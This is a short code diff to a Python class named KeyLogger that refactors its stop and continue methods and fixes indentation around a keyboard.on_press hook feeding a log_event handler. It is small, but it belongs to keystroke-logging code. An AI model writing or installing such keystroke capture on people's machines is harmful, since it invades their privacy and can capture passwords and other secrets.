@@ -34,14 +34,14 @@ class KeyLogger:
         self.buffer = {}
         return data
 
-    def stop(self):
-        self.running = False
+    def stop_continue(self, status: bool):
+        self.running = status
 
     def start(self):
-            keyboard.on_press(self.log_event)
+        keyboard.on_press(self.log_event)
 
     def continue_listen(self):
-            self.running = True
+        self.running = True
 
 #
 # if __name__ == "__main__":
